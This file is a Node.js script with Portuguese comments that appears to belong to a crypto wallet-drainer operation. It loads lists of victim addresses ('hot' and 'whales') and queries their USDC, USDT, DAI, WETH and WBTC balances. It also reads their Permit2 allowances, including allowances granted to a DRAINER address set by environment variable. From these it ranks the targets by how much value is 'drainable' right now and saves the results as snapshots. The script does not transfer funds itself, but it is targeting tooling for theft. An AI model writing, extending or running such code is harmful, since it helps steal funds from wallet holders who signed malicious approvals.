/// Atualiza saldos e allowance no Permit2 de uma lista de alvos via RPC.
/// Uso: node ops/refresh.mjs hot.json whales.json
import { Contract, Interface, JsonRpcProvider, formatUnits, getAddress } from "ethers";
import { readFileSync, writeFileSync, mkdirSync } from "node:fs";

const files = process.argv.slice(2);
if (files.length === 0) files.push("hot.json", "whales.json");

const RPC = process.env.RPC_URL || "https://ethereum-rpc.publicnode.com";
const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const MULTICALL = "0xcA11bde05977b3631167028862bE2a173976CA11";

const TOKENS = {
  USDC: { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6 },
  USDT: { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
  DAI: { address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", decimals: 18 },
  WETH: { address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18 },
  WBTC: { address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", decimals: 8 },
};

const erc20 = new Interface([
  "function balanceOf(address) view returns (uint256)",
  "function allowance(address,address) view returns (uint256)",
]);
const permit2 = new Interface([
  "function allowance(address,address,address) view returns (uint160 amount, uint48 expiration, uint48 nonce)",
]);
const mc = new Interface(["function tryAggregate(bool,(address,bytes)[]) returns ((bool,bytes)[])"]);

const provider = new JsonRpcProvider(RPC, 1, { staticNetwork: true });
const now = Math.floor(Date.now() / 1000);

async function prices() {
  const r = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=ethereum,bitcoin&vs_currencies=usd");
  const j = await r.json();
  if (!j.ethereum || !j.bitcoin) throw new Error("preço indisponível");
  return { USDC: 1, USDT: 1, DAI: 1, WETH: j.ethereum.usd, WBTC: j.bitcoin.usd };
}

const USD = await prices();
const targets = new Map();
for (const f of files) {
  for (const row of JSON.parse(readFileSync(f, "utf8"))) {
    const owner = getAddress(row.owner);
    const t = targets.get(owner) || { owner, sources: new Set() };
    t.sources.add(f.replace(".json", ""));
    targets.set(owner, t);
  }
}

const addrs = [...targets.keys()];
const calls = [];
for (const owner of addrs) {
  for (const [symbol, meta] of Object.entries(TOKENS)) {
    calls.push({ owner, symbol, target: meta.address, data: erc20.encodeFunctionData("balanceOf", [owner]) });
    calls.push({ owner, symbol, target: meta.address, data: erc20.encodeFunctionData("allowance", [owner, PERMIT2]), isAllow: true });
    if (process.env.DRAINER) {
      calls.push({ owner, symbol, target: PERMIT2, data: permit2.encodeFunctionData("allowance", [owner, meta.address, process.env.DRAINER]), isP2: true });
    }
  }
}

for (let i = 0; i < calls.length; i += 100) {
  const chunk = calls.slice(i, i + 100);
  const data = mc.encodeFunctionData("tryAggregate", [false, chunk.map((c) => [c.target, c.data])]);
  const ret = await provider.call({ to: MULTICALL, data });
  const [results] = mc.decodeFunctionResult("tryAggregate", ret);
  results.forEach((r, idx) => {
    const c = chunk[idx];
    const t = targets.get(c.owner);
    const tok = (t.tokens ||= {});
    const e = (tok[c.symbol] ||= { symbol: c.symbol, decimals: TOKENS[c.symbol].decimals, balance: 0n, approveP2: 0n, p2: 0n, expiration: 0 });
    if (!r[0]) return;
    if (c.isP2) {
      const [amount, expiration] = permit2.decodeFunctionResult("allowance", r[1]);
      e.p2 = amount;
      e.expiration = Number(expiration);
    } else if (c.isAllow) {
      e.approveP2 = erc20.decodeFunctionResult("allowance", r[1])[0];
    } else {
      e.balance = erc20.decodeFunctionResult("balanceOf", r[1])[0];
    }
  });
}

const out = [];
for (const t of targets.values()) {
  const items = [];
  let total = 0;
  let drainable = 0;
  for (const e of Object.values(t.tokens || {})) {
    const human = Number(formatUnits(e.balance, e.decimals));
    const allow = Number(formatUnits(e.approveP2, e.decimals));
    const scoped = process.env.DRAINER ? Number(formatUnits(e.p2, e.decimals)) : allow;
    const expOk = process.env.DRAINER ? e.expiration === 0 || e.expiration > now : true;
    const live = expOk ? Math.min(human, allow, scoped) : 0;
    if (human > 0) {
      items.push({ symbol: e.symbol, human, drainable: live, approveP2: allow, expiration: e.expiration || 0 });
      total += human * USD[e.symbol];
      drainable += live * USD[e.symbol];
    }
  }
  out.push({ owner: t.owner, sources: [...t.sources].sort(), usd: total, drainableUsd: drainable, items: items.sort((a, b) => b.human - a.human) });
}
out.sort((a, b) => b.drainableUsd - a.drainableUsd);

mkdirSync("snapshots", { recursive: true });
const stamp = new Date().toISOString().replace(/[:.]/g, "-");
const file = `snapshots/${stamp}.json`;
writeFileSync(file, JSON.stringify({ at: new Date().toISOString(), rpc: RPC, prices: USD, targets: out }, null, 1));

console.log(`snapshot: ${file}`);
console.log(`alvos: ${out.length} | saldo: $${out.reduce((s, x) => s + x.usd, 0).toFixed(2)} | drenavel agora: $${out.reduce((s, x) => s + x.drainableUsd, 0).toFixed(2)}`);
console.table(out.slice(0, 40).map((x) => ({
  alvo: x.owner,
  saldoUsd: x.usd.toFixed(2),
  drenavelUsd: x.drainableUsd.toFixed(2),
  tokens: x.items.map((i) => `${i.symbol}:${i.human.toFixed(4)}`).join(" "),
})));
